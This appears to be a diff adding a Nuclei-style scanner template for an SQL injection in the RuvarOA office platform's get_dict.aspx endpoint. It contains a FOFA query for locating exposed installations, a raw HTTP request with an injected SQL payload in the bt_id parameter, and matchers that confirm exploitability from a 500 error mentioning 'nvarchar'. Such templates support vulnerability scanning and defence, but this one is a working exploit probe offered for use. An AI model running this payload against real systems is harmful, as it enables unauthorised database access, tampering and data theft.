@@ -1,0 +1,25 @@
+id: ruvaroa-get_dict-sqli
+
+info:
+  name: RuvarOA协同办公平台 get_dict 接口SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="txt_admin_key"
+      RuvarOA协同办公平台在get_dict接口处理过程中存在SQL注入漏洞，攻击者可通过构造恶意SQL语句实现对数据库的未授权访问，包括但不限于数据篡改、删除或插入操作，进而导致数据完整性受损或敏感信息泄露。
+  tags: RuvarOA协同办公平台
+
+http:
+- raw:
+  - |
+    GET /include/get_dict.aspx?bi_value=1&bt_id=1%29+AND+1248+IN+%28SELECT+@@version%29+AND+%282558%3D2558&bt_name=1&bi_name=1 HTTP/1.1
+    Host: {{Hostname}}
+    Connection: close
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [500]
+  - type: word
+    part: body
+    words:
+    - 'nvarchar'
